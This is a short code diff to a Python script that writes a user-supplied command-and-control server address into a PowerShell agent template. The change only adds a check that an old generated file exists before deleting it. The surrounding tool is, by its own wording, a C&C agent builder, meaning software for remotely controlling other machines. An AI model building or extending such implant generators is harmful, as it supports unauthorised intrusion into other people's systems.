@@ -18,7 +18,12 @@ old = '$ccserver = "192.168.9.4:8000"'
 new = '$ccserver = "' + server + '"'
 
 # Delete old file
-os.remove('./AgentRequirements/' + fileName)
+if os.path.exists('./AgentRequirements/' + fileName):
+    os.remove('./AgentRequirements/' + fileName)
+else:
+    print('')
+
+#os.remove('./AgentRequirements/' + fileName)
 # open the skeleton .ps1 file and replace with user input of C&C Server
 with open('./AgentRequirements/' + skeleton, 'r') as f:
     for line in f:
